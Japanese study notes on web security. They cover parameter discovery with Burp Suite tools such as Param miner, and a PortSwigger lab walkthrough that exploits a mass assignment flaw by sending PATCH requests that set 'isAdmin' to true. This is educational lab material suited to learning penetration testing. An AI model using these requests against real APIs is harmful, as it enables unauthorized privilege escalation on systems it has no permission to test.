
## ツールによるパラメタの発見

###### Intruder(Turbo)

- パラメタの一般的な名前の[wordlist](https://github.com/RobertJonnyTiger/Hidden-Parameter-Injector/blob/main/common-params.txt):このwordlistはオブジェクトやアクションも含む
- アプリケーションに関連する名前も含めるのがいいかも

###### Engagement tools: [Content discovery](https://portswigger.net/burp/documentation/desktop/tools/engagement-tools/content-discovery)(pro)

- コンテンツだけでなくパラメタも暴く

##### ⭐️BAPP: [Param miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)

- Extensions -> Gusess ->  (cookies|headers|params) -> attack config
	- 実行様子はLogger++で見る
	- Extensions-> Param miner -> Outputで結果を確認する
- リクエストごとに最大65,536個のパラメータ名を自動的に推測する
- スコープから取得した情報に基づいて、アプリケーションに関連する名前を自動的に推測

## Mass assignmentの脆弱性によるパラメタの発見と悪用

1. あるAPIエンドポイントへのリクエストorレスポンスのパラメタを観察する
```json
{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
}
```

2. 同様に、他のAPIエンドポイントへのリクエストorレスポンスのパラメタを観察する
```json
{ 
	"id": 123, 
	"name": "John Doe", 
	"email": "john@example.com", 
	"isAdmin": "false" 
}
```

3. `PATCH`メソッドもしくは`POST`と共に、他のエンドポイントで使用されているパラメタを使ってみる

- まずは正常な値を入力し、エラーが返らないか確認する
```http
PATCH /api/users/
...

{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
	"isAdmin": false, 
}
```

- 次に、適当な値を入力し、エラーが返るか確認する。エラーが返る＝パラメタを正常に更新
```http
...
	"isAdmin": hogehoge, 
}
```

4. パラメタの値を改変
```http
PATCH /api/users/
...

{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
	"isAdmin": true, 
}
```

[Lab: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)

###### Mass assignmentとは

- 開発者が使用しているフレームワークによって、開発者の意図しないパラメータがクライアントから送信され、これが内部オブジェクトのフィールドにバインドされること
- 現在のリクエストに表示はされてなくても、バインドされているかもしれない
